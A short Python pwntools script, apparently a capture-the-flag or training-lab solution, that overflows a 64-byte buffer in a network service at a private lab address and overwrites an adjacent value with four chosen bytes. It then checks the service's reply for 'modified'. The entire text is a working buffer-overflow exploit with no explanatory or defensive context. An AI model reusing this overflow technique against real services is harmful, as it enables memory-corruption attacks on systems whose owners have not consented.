from pwn import *


buff = "A"*64
shellcode = buff + "\x37\x33\x33\x31"
kon = remote('192.168.56.101', 1337)
kon.send(shellcode)
kon.recvuntil('modified')
kon.recvline()
kon.close()
